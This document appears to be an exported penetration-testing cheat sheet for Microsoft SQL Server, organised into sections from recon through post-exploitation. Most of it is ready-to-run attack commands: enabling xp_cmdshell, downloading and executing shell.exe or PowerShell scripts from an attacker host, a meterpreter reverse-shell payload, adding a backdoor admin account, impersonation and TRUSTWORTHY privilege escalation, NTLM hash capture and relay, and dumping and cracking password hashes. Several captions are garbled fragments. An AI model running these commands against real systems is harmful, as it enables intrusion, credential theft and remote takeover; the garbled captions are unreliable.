---
id: "xn6jl9ay4mpn0ac7g"
title: "mssql"
description: ""
tags: []
order: "7"
createdAt: "2026-05-26T19:06:12.940Z"
updatedAt: "2026-05-26T19:06:31.486Z"
---

## Recon & Enumeration
<!-- section: {"id":"buw4n6p7jmpn0aqck","order":0,"collapsed":false} -->

### 1sjba7xanmpn0aqea
```bash
nmap -sV -sC -p 1433 $TARGET
nmap -sV -p 1433 --script ms-sql-info $TARGET
nmap -sV -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-config $TARGET
rustscan -a $TARGET -p 1433 -- -sV -sC
```

_Recon & Enumeration Initial MSSQL port detection and fingerprinting._

**Tags:** mssql, recon, nmap, rustscan
<!-- cmd: {"id":"1sjba7xanmpn0aqea","language":"bash","sectionId":"buw4n6p7jmpn0aqck","tags":["mssql","recon","nmap","rustscan"]} -->

### n1kyl4649mpn0aqef
```bash
nmap -sU -p 1434 --script ms-sql-info $TARGET
nmap -sU -p 1434 $SUBNET/24
impacket-mssqlclient -port 1434 $DOMAIN/$USER:$PASS@$TARGET
```

_Tags: #mssql, #recon, #nmap, #rustscan Discover MSSQL instances via UDP broadcast._

**Tags:** mssql, udp, discovery, nmap, impacket
<!-- cmd: {"id":"n1kyl4649mpn0aqef","language":"bash","sectionId":"buw4n6p7jmpn0aqck","tags":["mssql","udp","discovery","nmap","impacket"]} -->

### c7rbvhyrympn0aqei
```bash
netexec mssql $TARGET -u $USER -p $PASS
netexec mssql $SUBNET/24 -u $USER -p $PASS
netexec mssql $TARGET -u $USER -p $PASS --local-auth
```

_Tags: #mssql, #udp, #discovery, #nmap, #impacket Enumerate MSSQL via netexec._

**Tags:** mssql, enum, netexec, authenticated
<!-- cmd: {"id":"c7rbvhyrympn0aqei","language":"bash","sectionId":"buw4n6p7jmpn0aqck","tags":["mssql","enum","netexec","authenticated"]} -->

## Authentication
<!-- section: {"id":"098ahgqcbmpn0aqcr","order":1,"collapsed":false} -->

### 08cexg1mnmpn0aqeu
```bash
# Password auth
impacket-mssqlclient $DOMAIN/$USER:$PASS@$TARGET -windows-auth
impacket-mssqlclient $USER:$PASS@$TARGET

# Hash auth
impacket-mssqlclient $DOMAIN/$USER@$TARGET -hashes :$HASH -windows-auth

# Kerberos auth
export KRB5CCNAME=$USER.ccache
impacket-mssqlclient $DOMAIN/$USER@$TARGET -k -no-pass -windows-auth
```

_Authentication Connect with various credential types._

**Tags:** mssql, authentication, impacket, pass-the-hash, kerberos
<!-- cmd: {"id":"08cexg1mnmpn0aqeu","language":"bash","sectionId":"098ahgqcbmpn0aqcr","tags":["mssql","authentication","impacket","pass-the-hash","kerberos"]} -->

### b98moaeqbmpn0aqez
```bash
netexec mssql $TARGET -u 'sa' -p 'sa'
netexec mssql $TARGET -u 'sa' -p ''
netexec mssql $TARGET -u 'sa' -p 'password'
netexec mssql $TARGET -u 'sa' -p 'Password1'
netexec mssql $TARGET -u 'sa' -p 'admin'
impacket-mssqlclient sa:@$TARGET
```

_Tags: #mssql, #authentication, #impacket, #pass-the-hash, #kerberos Default and common credentials check._

**Tags:** mssql, default-credentials, sa, authentication, misconfiguration
<!-- cmd: {"id":"b98moaeqbmpn0aqez","language":"bash","sectionId":"098ahgqcbmpn0aqcr","tags":["mssql","default-credentials","sa","authentication","misconfiguration"]} -->

## Enumeration (Authenticated)
<!-- section: {"id":"gkrbf2wukmpn0aqcv","order":2,"collapsed":false} -->

### 0razbfc8empn0aqf5
```sql
-- Via impacket-mssqlclient (interactive)
impacket-mssqlclient $DOMAIN/$USER:$PASS@$TARGET -windows-auth
SELECT name FROM master.dbo.sysdatabases;
SELECT name FROM master.sys.databases;
SELECT * FROM information_schema.tables;
SELECT name, password_hash FROM sys.sql_logins;
SELECT * FROM sys.server_principals;
EXEC sp_helplinkedsrvlogin;
SELECT * FROM sys.servers;
```

_hash FROM sys.sql_

**Tags:** mssql, enum, databases, users, authenticated, impacket
<!-- cmd: {"id":"0razbfc8empn0aqf5","language":"sql","sectionId":"gkrbf2wukmpn0aqcv","tags":["mssql","enum","databases","users","authenticated","impacket"]} -->

### 2wzqh7q2empn0aqf8
```bash
netexec mssql $TARGET -u $USER -p $PASS -M mssql_priv
netexec mssql $TARGET -u $USER -p $PASS --local-auth -M mssql_priv
```

_Tags: #mssql, #enum, #databases, #users, #authenticated, #impacket Enumerate via netexec modules._

**Tags:** mssql, enum, netexec, privileges
<!-- cmd: {"id":"2wzqh7q2empn0aqf8","language":"bash","sectionId":"gkrbf2wukmpn0aqcv","tags":["mssql","enum","netexec","privileges"]} -->

### 3fxtu0466mpn0aqfc
```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT IS_SRVROLEMEMBER('db_owner');
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
EXEC sp_helpsrvrolemember 'sysadmin';
SELECT name FROM sys.server_principals WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1;
```

_SRVROLEMEMBER('db_

**Tags:** mssql, privileges, enum, sysadmin, authenticated
<!-- cmd: {"id":"3fxtu0466mpn0aqfc","language":"sql","sectionId":"gkrbf2wukmpn0aqcv","tags":["mssql","privileges","enum","sysadmin","authenticated"]} -->

## xp_cmdshell — OS Command Execution
<!-- section: {"id":"jzen2y0qlmpn0aqcy","order":3,"collapsed":false} -->

### 1834rpcq7mpn0aqfo
```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute OS commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user';
EXEC xp_cmdshell 'net localgroup administrators';
EXEC xp_cmdshell 'powershell -e $BASE64_PAYLOAD';
EXEC xp_cmdshell 'certutil -urlcache -split -f http://$LHOST/shell.exe C:\Windows\Temp\shell.exe && C:\Windows\Temp\shell.exe';
```

_configure 'xp_

**Tags:** mssql, xp-cmdshell, rce, command-execution, privilege-escalation
<!-- cmd: {"id":"1834rpcq7mpn0aqfo","language":"sql","sectionId":"jzen2y0qlmpn0aqcy","tags":["mssql","xp-cmdshell","rce","command-execution","privilege-escalation"]} -->

### nz60l94xympn0aqft
```bash
netexec mssql $TARGET -u $USER -p $PASS -x "whoami"
netexec mssql $TARGET -u $USER -p $PASS -x "whoami /all"
netexec mssql $TARGET -u $USER -p $PASS -x "powershell -e $BASE64_PAYLOAD"
netexec mssql $TARGET -u $USER -H $HASH -x "net user hacker Password123! /add"
```

_Tags: #mssql, #xp-cmdshell, #rce, #command-execution, #privilege-escalation Via netexec._

**Tags:** mssql, xp-cmdshell, rce, netexec, command-execution
<!-- cmd: {"id":"nz60l94xympn0aqft","language":"bash","sectionId":"jzen2y0qlmpn0aqcy","tags":["mssql","xp-cmdshell","rce","netexec","command-execution"]} -->

## Privilege Escalation
<!-- section: {"id":"dgh6l33xbmpn0aqd1","order":4,"collapsed":false} -->

### aumy1x6zbmpn0aqg1
```sql
-- Check who can be impersonated
SELECT distinct b.name FROM sys.server_permissions a
     INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
     WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate sa or sysadmin
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
EXEC xp_cmdshell 'whoami';

-- Impersonate within database
EXECUTE AS USER = 'dbo';
SELECT USER_NAME();
```

_principals b ON a.grantor_

**Tags:** mssql, impersonation, privilege-escalation, sysadmin, ad-abuse
<!-- cmd: {"id":"aumy1x6zbmpn0aqg1","language":"sql","sectionId":"dgh6l33xbmpn0aqd1","tags":["mssql","impersonation","privilege-escalation","sysadmin","ad-abuse"]} -->

### rf88wwcsnmpn0aqg5
```sql
SELECT rp.name as database_role, mp.name as database_user
     FROM sys.database_role_members drm
     JOIN sys.database_principals rp ON drm.role_principal_id = rp.principal_id
     JOIN sys.database_principals mp ON drm.member_principal_id = mp.principal_id;

-- Create stored procedure as db_owner to add sysadmin
USE $DATABASE;
CREATE PROCEDURE sp_escalate WITH EXECUTE AS OWNER AS
     EXEC sp_addsrvrolemember '$USER', 'sysadmin';
EXEC sp_escalate;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

_role, mp.name as database_

**Tags:** mssql, db-owner, privilege-escalation, sysadmin, stored-procedure
<!-- cmd: {"id":"rf88wwcsnmpn0aqg5","language":"sql","sectionId":"dgh6l33xbmpn0aqd1","tags":["mssql","db-owner","privilege-escalation","sysadmin","stored-procedure"]} -->

### rcqecxv6nmpn0aqg9
```sql
-- Find trustworthy databases owned by sysadmin
SELECT d.name, d.is_trustworthy_on, l.name
     FROM sys.databases d
     INNER JOIN sys.server_principals l ON d.owner_sid = l.sid
     WHERE d.is_trustworthy_on = 1 AND l.name = 'sa';

-- Exploit via stored procedure
USE $TRUSTWORTHY_DB;
CREATE PROCEDURE sp_privesc WITH EXECUTE AS OWNER AS
     EXEC sp_addsrvrolemember '$USER', 'sysadmin';
EXEC sp_privesc;
```

_trustworthy_

**Tags:** mssql, trustworthy, privilege-escalation, sysadmin, misconfiguration
<!-- cmd: {"id":"rcqecxv6nmpn0aqg9","language":"sql","sectionId":"dgh6l33xbmpn0aqd1","tags":["mssql","trustworthy","privilege-escalation","sysadmin","misconfiguration"]} -->

## Linked Server Attacks
<!-- section: {"id":"b3pk0wxk8mpn0aqd5","order":5,"collapsed":false} -->

### 9fjy71bk2mpn0aqgk
```sql
-- Enumerate linked servers
EXEC sp_linkedservers;
SELECT * FROM sys.servers;
EXEC sp_helplinkedsrvlogin;

-- Execute query on linked server
SELECT * FROM OPENQUERY("$LINKED_SERVER", 'SELECT SYSTEM_USER');
SELECT * FROM OPENQUERY("$LINKED_SERVER", 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');

-- Execute xp_cmdshell on linked server
EXEC ('xp_cmdshell ''whoami''') AT [$LINKED_SERVER];
SELECT * FROM OPENQUERY("$LINKED_SERVER", 'EXEC xp_cmdshell ''whoami''');

-- Enable xp_cmdshell on linked server
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE') AT [$LINKED_SERVER];
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT [$LINKED_SERVER];
EXEC ('xp_cmdshell ''whoami''') AT [$LINKED_SERVER];
```

_SERVER", 'SELECT SYSTEM_

**Tags:** mssql, linked-servers, lateral-movement, rce, privilege-escalation
<!-- cmd: {"id":"9fjy71bk2mpn0aqgk","language":"sql","sectionId":"b3pk0wxk8mpn0aqd5","tags":["mssql","linked-servers","lateral-movement","rce","privilege-escalation"]} -->

### snjf7fw0mmpn0aqgp
```sql
-- Double hop via linked servers
EXEC ('EXEC (''xp_cmdshell ''''whoami''''; '') AT [$LINKED_SERVER_2]') AT [$LINKED_SERVER_1];

-- Query chained linked server
SELECT * FROM OPENQUERY([$LINKED_SERVER_1],
     'SELECT * FROM OPENQUERY([$LINKED_SERVER_2], ''SELECT SYSTEM_USER'')');
```

_cmdshell ''''whoami''''; '') AT [$LINKED_

**Tags:** mssql, linked-servers, lateral-movement, chaining, rce
<!-- cmd: {"id":"snjf7fw0mmpn0aqgp","language":"sql","sectionId":"b3pk0wxk8mpn0aqd5","tags":["mssql","linked-servers","lateral-movement","chaining","rce"]} -->

## UNC Path Injection / Hash Capture
<!-- section: {"id":"zzwss752tmpn0aqd8","order":6,"collapsed":false} -->

### bhai31wzumpn0aqgw
```bash
# Start Responder
responder -I $INTERFACE -dwv

# Trigger UNC path via xp_dirtree
SQL> EXEC xp_dirtree '\\$LHOST\share';
SQL> EXEC xp_fileexist '\\$LHOST\share\file';
SQL> EXEC xp_subdirs '\\$LHOST\share';
SQL> SELECT * FROM fn_xe_file_target_read_file('\\$LHOST\share\*', NULL, NULL, NULL);
```

_xe_

**Tags:** mssql, unc-injection, hash-capture, responder, ntlm, credential-access
<!-- cmd: {"id":"bhai31wzumpn0aqgw","language":"bash","sectionId":"zzwss752tmpn0aqd8","tags":["mssql","unc-injection","hash-capture","responder","ntlm","credential-access"]} -->

### e48nqar57mpn0aqh0
```bash
# Terminal 1 — Setup relay
impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# Terminal 2 — Trigger UNC
SQL> EXEC xp_dirtree '\\$LHOST\share';
```

_Tags: #mssql, #unc-injection, #hash-capture, #responder, #ntlm, #credential-access Relay captured MSSQL hash._

**Tags:** mssql, ntlm-relay, unc-injection, ntlmrelayx, lateral-movement
<!-- cmd: {"id":"e48nqar57mpn0aqh0","language":"bash","sectionId":"zzwss752tmpn0aqd8","tags":["mssql","ntlm-relay","unc-injection","ntlmrelayx","lateral-movement"]} -->

## File Read / Write
<!-- section: {"id":"w62okohclmpn0aqdb","order":7,"collapsed":false} -->

### 9efsiph0lmpn0aqh8
```sql
-- Read file (requires BULK INSERT or OPENROWSET)
SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS Contents;
SELECT * FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS Contents;

-- Write file via xp_cmdshell
EXEC xp_cmdshell 'echo "test" > C:\Windows\Temp\test.txt';
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://$LHOST/shell.ps1'')"';

-- Write via OLE Automation
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @OLE INT;
DECLARE @FileID INT;
EXEC sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
EXEC sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'C:\Temp\shell.ps1', 8, 1;
EXEC sp_OAMethod @FileID, 'WriteLine', NULL, 'IEX(New-Object Net.WebClient).DownloadString(''http://$LHOST/shell.ps1'')';
EXEC sp_OAMethod @FileID, 'Close';
EXEC sp_OADestroy @FileID;
EXEC sp_OADestroy @OLE;
```

_File Read / Write Read and write files via MSSQL._

**Tags:** mssql, file-read, file-write, openrowset, ole-automation, rce
<!-- cmd: {"id":"9efsiph0lmpn0aqh8","language":"sql","sectionId":"w62okohclmpn0aqdb","tags":["mssql","file-read","file-write","openrowset","ole-automation","rce"]} -->

## Credential Access
<!-- section: {"id":"c4xs0pxuimpn0aqdf","order":8,"collapsed":false} -->

### tqbcrt14empn0aqhe
```sql
-- SQL login password hashes
SELECT name, password_hash FROM sys.sql_logins;

-- Linked server credentials
SELECT srvname, srvproduct, providername, datasource FROM sys.servers;
EXEC sp_helplinkedsrvlogin;

-- Agent job credentials
SELECT name, description FROM msdb.dbo.sysjobs;
SELECT step_name, command FROM msdb.dbo.sysjobsteps;
```

_hash FROM sys.sql_

**Tags:** mssql, credential-access, password-hash, linked-servers, agent-jobs
<!-- cmd: {"id":"tqbcrt14empn0aqhe","language":"sql","sectionId":"c4xs0pxuimpn0aqdf","tags":["mssql","credential-access","password-hash","linked-servers","agent-jobs"]} -->

### m6re8ziwrmpn0aqhi
```bash
netexec mssql $TARGET -u $USER -p $PASS -M mssql_priv
```

_Tags: #mssql, #credential-access, #password-hash, #linked-servers, #agent-jobs Dump via netexec._

**Tags:** mssql, credential-access, netexec, privileges
<!-- cmd: {"id":"m6re8ziwrmpn0aqhi","language":"bash","sectionId":"c4xs0pxuimpn0aqdf","tags":["mssql","credential-access","netexec","privileges"]} -->

### hgsk94zzompn0aqhm
```bash
# Extract hashes
SQL> SELECT name, CONVERT(VARCHAR(MAX), password_hash, 2) FROM sys.sql_logins;

# Crack with hashcat (mode 1731 for MSSQL 2012+)
hashcat -m 1731 mssql_hashes.txt rockyou.txt
hashcat -m 131 mssql_hashes.txt rockyou.txt   # MSSQL 2000
hashcat -m 132 mssql_hashes.txt rockyou.txt   # MSSQL 2005
```

_hash, 2) FROM sys.sql_

**Tags:** mssql, password-hash, hashcat, cracking, credential-access
<!-- cmd: {"id":"hgsk94zzompn0aqhm","language":"bash","sectionId":"c4xs0pxuimpn0aqdf","tags":["mssql","password-hash","hashcat","cracking","credential-access"]} -->

## Reverse Shell via MSSQL
<!-- section: {"id":"b0olt0ez7mpn0aqdi","order":9,"collapsed":false} -->

### ibm97m40dmpn0aqhy
```bash
# PowerShell reverse shell via xp_cmdshell
SQL> EXEC xp_cmdshell 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdA...';

# Download and execute
SQL> EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://$LHOST/Invoke-PowerShellTcp.ps1'')"';

# Certutil download
SQL> EXEC xp_cmdshell 'certutil -urlcache -split -f http://$LHOST/shell.exe C:\Temp\shell.exe';
SQL> EXEC xp_cmdshell 'C:\Temp\shell.exe';

# MSF payload delivery
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe
SQL> EXEC xp_cmdshell 'certutil -urlcache -split -f http://$LHOST/shell.exe C:\Temp\shell.exe && C:\Temp\shell.exe';
```

_Reverse Shell via MSSQL Get reverse shell through MSSQL._

**Tags:** mssql, reverse-shell, xp-cmdshell, powershell, rce, metasploit
<!-- cmd: {"id":"ibm97m40dmpn0aqhy","language":"bash","sectionId":"b0olt0ez7mpn0aqdi","tags":["mssql","reverse-shell","xp-cmdshell","powershell","rce","metasploit"]} -->

## Post-Exploitation
<!-- section: {"id":"nuxkcualkmpn0aqdm","order":10,"collapsed":false} -->

### dxl50xa7dmpn0aqi5
```sql
-- Enumerate all databases
SELECT name, database_id, create_date FROM sys.databases;

-- Search for sensitive data patterns
SELECT TABLE_CATALOG, TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME
     FROM INFORMATION_SCHEMA.COLUMNS
     WHERE COLUMN_NAME LIKE '%password%'
     OR COLUMN_NAME LIKE '%secret%'
     OR COLUMN_NAME LIKE '%credential%'
     OR COLUMN_NAME LIKE '%hash%';

-- Dump specific table
SELECT TOP 100 * FROM $DATABASE.dbo.$TABLE;

-- Check SQL Agent jobs for creds
SELECT j.name, s.step_name, s.command
     FROM msdb.dbo.sysjobs j
     JOIN msdb.dbo.sysjobsteps s ON j.job_id = s.job_id;

-- Check registry via xp_regread
EXEC xp_regread 'HKEY_LOCAL_MACHINE',
     'SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL';
```

_id, create_

**Tags:** mssql, post-exploitation, data-exfiltration, sensitive-data, registry
<!-- cmd: {"id":"dxl50xa7dmpn0aqi5","language":"sql","sectionId":"nuxkcualkmpn0aqdm","tags":["mssql","post-exploitation","data-exfiltration","sensitive-data","registry"]} -->

## Vulnerability Checks
<!-- section: {"id":"fj215q0rjmpn0aqdp","order":11,"collapsed":false} -->

### zx3bzhzdkmpn0aqic
```bash
nmap -sV -p 1433 --script ms-sql-info,ms-sql-config,ms-sql-empty-password $TARGET
nmap -p 1433 --script ms-sql-hasdbaccess $TARGET
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa $TARGET
nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=sa,mssql.password=sa $TARGET
```

_Vulnerability Checks Check for common MSSQL vulnerabilities._

**Tags:** mssql, vuln-check, nmap, nse, xp-cmdshell, empty-password
<!-- cmd: {"id":"zx3bzhzdkmpn0aqic","language":"bash","sectionId":"fj215q0rjmpn0aqdp","tags":["mssql","vuln-check","nmap","nse","xp-cmdshell","empty-password"]} -->

## Misconfigurations Checklist
<!-- section: {"id":"mbo9a3kulmpn0aqds","order":12,"collapsed":false} -->

### fwjdc8nkumpn0aqim
```bash
# 1. Default/empty SA password
netexec mssql $TARGET -u 'sa' -p ''
netexec mssql $TARGET -u 'sa' -p 'sa'

# 2. xp_cmdshell enabled
netexec mssql $TARGET -u $USER -p $PASS -x "SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'"

# 3. Sysadmin check
netexec mssql $TARGET -u $USER -p $PASS -M mssql_priv

# 4. Linked servers
netexec mssql $TARGET -u $USER -p $PASS -x "EXEC sp_linkedservers"

# 5. Trustworthy databases
netexec mssql $TARGET -u $USER -p $PASS -x "SELECT name, is_trustworthy_on FROM sys.databases WHERE is_trustworthy_on = 1"

# 6. Ole Automation enabled
netexec mssql $TARGET -u $USER -p $PASS -x "SELECT * FROM sys.configurations WHERE name = 'Ole Automation Procedures'"

# 7. Impersonation rights
netexec mssql $TARGET -u $USER -p $PASS -x "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'"

# 8. UNC path injection test
netexec mssql $TARGET -u $USER -p $PASS -M mssql_priv
```

_trustworthy_

**Tags:** mssql, misconfiguration, checklist, sa, xp-cmdshell, trustworthy, impersonation, linked-servers
<!-- cmd: {"id":"fwjdc8nkumpn0aqim","language":"bash","sectionId":"mbo9a3kulmpn0aqds","tags":["mssql","misconfiguration","checklist","sa","xp-cmdshell","trustworthy","impersonation","linked-servers"]} -->
